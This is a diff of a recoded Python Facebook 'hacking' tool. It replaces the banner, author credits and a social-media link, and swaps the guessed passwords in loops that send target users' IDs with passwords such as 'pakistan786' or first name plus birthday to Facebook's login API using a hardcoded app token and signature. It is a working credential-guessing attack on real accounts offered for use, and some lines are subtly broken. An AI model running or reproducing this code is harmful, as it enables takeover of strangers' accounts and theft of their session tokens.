@@ -28,7 +28,7 @@ def exit():
 	os.system('clear')
 	print "\033[1;91m[!] Closing the tool..."
 	os.system('sleep 3 && clear')
-	os.system('xdg-open https://web.facebook.com/mkdirlove.git')
+	os.system('xdg-open https://web.facebook.com/Akyoutuber06')
 	os.sys.exit()
         tool_main_function()
 
@@ -41,22 +41,18 @@ def mkdir(z):
 
 ##### LOGO #####
 logo = """
-\033[1;91m┌─────────────────────────────────────────────────────────────┐\033[1;91m
-│   ▄▄▄▄▄▄                      █                    █        │\033[1;91m
-│   █       ▄▄▄    ▄▄▄    ▄▄▄   █▄▄▄    ▄▄▄    ▄▄▄   █   ▄    │\033[1;91m
-│   █▄▄▄▄▄ ▀   █  █▀  ▀  █▀  █  █▀ ▀█  █▀ ▀█  █▀ ▀█  █ ▄▀     │\033[1;91m
-│   █      ▄▀▀▀█  █      █▀▀▀▀  █   █  █   █  █   █  █▀█      │\033[1;91m
-│   █      ▀▄▄▀█  ▀█▄▄▀  ▀█▄▄▀  ██▄█▀  ▀█▄█▀  ▀█▄█▀  █  ▀▄    │\033[1;91m
-│┏━┓┏┓╻┏━┓┏┓╻╻ ╻┏━┓┏━┓╻ ╻╻┏┓╻╻ ╻   ┏━┓╻ ╻╻╻  ╻┏━┓┏━┓╻┏┓╻┏━╸┏━┓│\033[1;91m
-│┣━┫┃┗┫┃ ┃┃┗┫┗┳┛┗━┓┣━┛┣━┫┃┃┗┫┏╋┛   ┣━┛┣━┫┃┃  ┃┣━┛┣━┛┃┃┗┫┣╸ ┗━┓│\033[1;91m
-│╹ ╹╹ ╹┗━┛╹ ╹ ╹ ┗━┛╹  ╹ ╹╹╹ ╹╹ ╹   ╹  ╹ ╹╹┗━╸╹╹  ╹  ╹╹ ╹┗━╸┗━┛│\033[1;91m
-└─────────────────────────────────────────────────────────────┘\033[1;91m
+\033[1;91m[ ██████╗██╗  ██╗██╗   ██╗██╗     ██████╗ ██╗   ██╗██╗     ██╗]
+\033[1;91m[██╔════╝██║  ██║██║   ██║██║     ██╔══██╗██║   ██║██║     ██║]
+\033[1;91m[██║     ███████║██║   ██║██║     ██████╔╝██║   ██║██║     ██║]
+\033[1;91m[██║     ██╔══██║██║   ██║██║     ██╔══██╗██║   ██║██║     ██║]
+\033[1;91m[╚██████╗██║  ██║╚██████╔╝███████╗██████╔╝╚██████╔╝███████╗██║]
+\033[1;91m[ ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═════╝  ╚═════╝ ╚══════╝╚═╝]
 \033[1;97m╔═════════════════════════════════════════════════════════════╗
-\033[1;97m║\033[1;93m* \033[1;97mTeam    \033[1;91m: \033[1;96mAnonySphinx Philippines \033[1;97m                         ║
-\033[1;97m║\033[1;93m* \033[1;97mRecode  \033[1;91m: \033[1;96mJayson Cabrillas San Buenaventura \033[1;97m               ║
-\033[1;97m║\033[1;93m* \033[1;97mGithub  \033[1;91m: \033[1;96mhttps://github.com/mkdirlove/FBTOOL\033[1;97m              ║
-\033[1;97m║\033[1;93m* \033[1;97mFB      \033[1;91m: \033[1;92m\033[4mhttps://web.facebook.com/mkdirlove.git\033[0m\033[1;97m           ║
-\033[1;97m║\033[1;93m* \033[1;97mCredits \033[1;91m: \033[1;96m[Wrath] [Magizz] [SantriCyber] \033[1;97m                  ║
+\033[1;97m║\033[1;93m* \033[1;97mTeam    \033[1;91m: \033[1;96mAnonymous Chulbuli \033[1;97m                              ║
+\033[1;97m║\033[1;93m* \033[1;97mRecode  \033[1;91m: \033[1;96mITZ CHULBULI\033[1;97m                                     ║
+\033[1;97m║\033[1;93m* \033[1;97mGithub  \033[1;91m: \033[1;96mhttps://github.com/Adeel-khokhar/Itz.Chulbuli\033[1;97m                 ║
+\033[1;97m║\033[1;93m* \033[1;97mFB      \033[1;91m: \033[1;92m\033[4mhttps://web.facebook.com/Akyoutuber06\033[0m\033[1;97m           ║
+\033[1;97m║\033[1;93m* \033[1;97mCredits \033[1;91m: \033[1;96m[ZOYA] [ITZ.CHULBULI] [ADEEL] \033[1;97m                   ║
 \033[1;97m║\033[1;93m* \033[1;97mNotice \033[1;91m : \033[1;96mThis is not my own work, i just recoded it. \033[1;97m     ║
 \033[1;97m║\033[1;93m* \033[1;97mVersion \033[1;91m: \033[1;92m\033[4m1.1.0\033[0m                        \033[1;97m                    ║
 \033[1;97m╚═════════════════════════════════════════════════════════════╝"""
@@ -1073,7 +1069,7 @@ def mini():
 									else:
 										lahirs = a['birthday']
 										jay = lahirs.replace('/', '')
-										pz5 = a['first_name']+jay
+										pz5 = a['first_name']+786
 										data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 										y = json.load(data)
 										if 'access_token' in y:
@@ -1093,7 +1089,7 @@ def mini():
 												raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 												menu_hack()
 											else:
-												pz6 = "bintang123"
+												pz6 = "786786"
 												data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 												y = json.load(data)
 												if 'access_token' in y:
@@ -1113,7 +1109,7 @@ def mini():
 														raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 														menu_hack()
 													else:
-														pz7 = "sayang123, sayang, bintang, bajingan, someone, anjing, pukimak, playboy, doraemon, bahagia"
+														pz7 = "pakistan"
 														data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 														y = json.load(data)
 														if 'access_token' in y:
@@ -1396,7 +1392,7 @@ def choices_super():
 											checkpoint.append(user+pass4)
 										else:
 											#Pass5
-											pass5 = "sayang123","sayangku123"
+											pass5 = "786786"
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if 'access_token' in q:
@@ -1412,7 +1408,7 @@ def choices_super():
 													checkpoint.append(user+pass5)
 												else:
 													#Pass6
-													pass6 = "bintang123","bintang12345"
+													pass6 = "pakistan"
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
@@ -1448,7 +1444,7 @@ def choices_super():
                                                                                                                                         #Pass8
                                                                                                                                          a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+fb_token)
                                                                                                                                          b = json.loads(a.text)
-                                                                                                                                         pass8 = "january","february","march","april","may","june","july","august","september","november","december"
+                                                                                                                                         pass8 = "pakistan786"
                                                                                                                                          data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%252525257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                                                                                                          q = json.load(data)
                                                                                                                                          if 'access_token' in q:
